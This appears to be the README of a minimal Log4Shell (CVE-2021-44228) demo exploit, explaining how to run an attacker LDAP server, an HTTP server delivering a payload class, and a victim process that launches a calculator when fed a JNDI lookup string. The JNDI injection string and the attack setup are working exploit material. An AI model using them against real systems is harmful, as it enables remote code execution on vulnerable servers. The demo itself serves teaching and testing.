# Log4Shell Demo Exploit

This is a minimal demo exploit for the Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)).
I created this to have a stripped-down demo that strictly focuses on the essentials instead of drowning in a bunch of Docker Compose/Node.js/Spring/Tomcat/... cruft.

The `LDAPRefServer` class was snatched from the MIT-licensed [marshalsec](https://github.com/mbechler/marshalsec) repository.
All other code in this repository is in the public domain.

## Prerequisites
* A UNIX shell
* Java
* Maven
* Python 3

## How to run

You need three console tabs: two for the attacker infrastructure and one for the victim.

### Attacker LDAP server
```sh
cd attacker/ldap
./ldapserver
```
This will open a JNDI LDAP server on port 1389.
The server will answer requests by referring the victim to the exploit payload served by the HTTP server.

### Attacker HTTP Server
```sh
cd attacker/http
./httpserver
```
This will compile the exploit payload and open an HTTP server on port 8888 that delivers the `Payload.class` file to would-be victims.

### Victim
```sh
cd victim
./victim
```
Now you can type in arbitrary lines of text and watch them being logged.
To trigger the vulnerability in Log4j, enter the following input:
```
${jndi:ldap://localhost:1389/a}
```
The exploit will trick the victim process into launching a calculator.
